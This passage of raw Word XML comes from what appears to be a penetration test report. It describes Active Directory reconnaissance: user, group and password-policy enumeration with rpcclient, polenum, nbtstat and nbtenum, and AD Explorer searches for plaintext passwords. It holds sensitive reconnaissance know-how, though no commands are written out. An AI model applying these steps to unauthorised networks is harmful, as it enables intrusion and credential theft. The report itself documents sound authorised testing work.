      </w:r>
    </w:p>
    <w:p w14:paraId="22DEDCCD" w14:textId="77777777" w:rsidR="008B509C" w:rsidRDefault="008B509C" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rpcclient</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> over smb was used via </w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>Linux</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to find the names of the users on the network as well as groups</w:t>
      </w:r>
      <w:r w:rsidR="00DC441B">
        <w:t xml:space="preserve"> and admin information</w:t>
      </w:r>
      <w:r w:rsidR="00337545">
        <w:t>. It was used with the account given by the company, “test”.</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t xml:space="preserve"> See fig 7. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC95D91" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rpcclient</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was also used to enumerate the names of groups and users within the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A176D3F" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="007E1CB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251683840" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="525D8B90" wp14:editId="69C0031B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>335610</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3211830" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="7620" b="4445"/>
                <wp:wrapTopAndBottom/>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1830" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="07C70A03" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>7. Rpcclient command used to scan the 1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007E1CB4">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                                <w:vertAlign w:val="superscript"/>
                              </w:rPr>
                              <w:t>st</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> server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5D8B90" id="_x0000_s1032" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:26.45pt;width:252.9pt;height:20.65pt;z-index:2516838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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="07C70A03" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>7. Rpcclient command used to scan the 1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007E1CB4">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                          <w:vertAlign w:val="superscript"/>
                        </w:rPr>
                        <w:t>st</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> server</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00425B82">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06440B56" wp14:editId="7B73A4A0">
            <wp:extent cx="4187190" cy="26670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0441" t="18022" r="53468" b="79023"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4192622" cy="267046"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC70777" w14:textId="77777777" w:rsidR="008B509C" w:rsidRDefault="008B509C" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Polenum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used on the target network to </w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>analyze</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> what the password policy was like</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>, see fig 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41764A8E" w14:textId="77777777" w:rsidR="00337545" w:rsidRDefault="007E1CB4" w:rsidP="00337545">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251685888" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1E7F8BC8" wp14:editId="1E2242A9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>251307</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3723005" cy="255905"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>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3005" cy="256032"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="68EAF52E" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">8 </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>–</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Polenum command used to retrieve password policy from server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7F8BC8" id="_x0000_s1033" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:19.8pt;width:293.15pt;height:20.15pt;z-index:251685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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="68EAF52E" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">8 </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>–</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Polenum command used to retrieve password policy from server 1</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00337545">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2364206B" wp14:editId="533C663D">
            <wp:extent cx="4245429" cy="190500"/>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9278" t="23340" r="54797" b="74591"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4257427" cy="191038"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7216F9D5" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="00337545">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="767B4ED2" w14:textId="77777777" w:rsidR="008B509C" w:rsidRDefault="008B509C" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nbtstat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used </w:t>
      </w:r>
      <w:r w:rsidR="0011744C">
        <w:t>to help Identify the administrator</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t>, see Fig 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738BC499" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="007E1CB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251687936" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4F2B02EF" wp14:editId="401C5D52">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1916202</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4140200" cy="424180"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>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0200" cy="424180"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0272CF2C" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">9 </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>–</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> Nbtstat is used to resolve NetBIOS problems, here, it is used for gathering information on it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2B02EF" id="_x0000_s1034" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:150.9pt;width:326pt;height:33.4pt;z-index:2516879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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0272CF2C" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">9 </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>–</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> Nbtstat is used to resolve NetBIOS problems, here, it is used for gathering information on it </w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00337545">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B34EC1B" wp14:editId="58528F10">
            <wp:extent cx="3400425" cy="179466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983" t="22220" r="64104" b="49634"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3441681" cy="1816443"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54021A97" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="00337545">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FC2FA2E" w14:textId="77777777" w:rsidR="0011744C" w:rsidRDefault="0011744C" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nbtenum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used </w:t>
      </w:r>
      <w:r w:rsidR="006F798B">
        <w:t xml:space="preserve">to enumerate the </w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4" w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NetBIOS</w:t>
      </w:r>
      <w:r w:rsidR="006F798B">
        <w:t>, to gain more specific information about the server in a clear and formatted form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2604A30F" w14:textId="77777777" w:rsidR="006E72FA" w:rsidRDefault="00C84540" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc27518400"/>
      <w:r>
        <w:t>Hacking</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="1AF0431A" w14:textId="77777777" w:rsidR="005860BE" w:rsidRDefault="005860BE" w:rsidP="0011744C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>AD explorer used to search for admin and plaintext passwords</w:t>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:t>, by traversing the directory looking for a description of password.</w:t>
      </w:r>
      <w:r w:rsidR="007E1CB4">
        <w:t xml:space="preserve"> See Fig 10.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4B0F52" w14:textId="77777777" w:rsidR="006E48D6" w:rsidRDefault="007E1CB4" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251689984" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="72474F0C" wp14:editId="34B07154">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>968349</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3211830" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="7620" b="4445"/>
                <wp:wrapTopAndBottom/>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1830" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="708A6BE6" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">10 </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>–</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> ad explorer parameters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474F0C" id="_x0000_s1035" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:76.25pt;width:252.9pt;height:20.65pt;z-index:2516899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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="708A6BE6" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="007E1CB4">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">10 </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>–</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> ad explorer parameters</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FF861A1" wp14:editId="26C64D95">
            <wp:extent cx="3848372" cy="914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2944" t="44187" r="58605" b="43795"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3892069" cy="924783"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="70976C37" w14:textId="77777777" w:rsidR="007E1CB4" w:rsidRDefault="007E1CB4" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C1F795B" w14:textId="77777777" w:rsidR="005860BE" w:rsidRDefault="007E1CB4" w:rsidP="005860BE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="007E1CB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251692032" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="209B1CC8" wp14:editId="79ABDB5A">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2427275</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3350260" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
                <wp:wrapTopAndBottom/>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0260" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
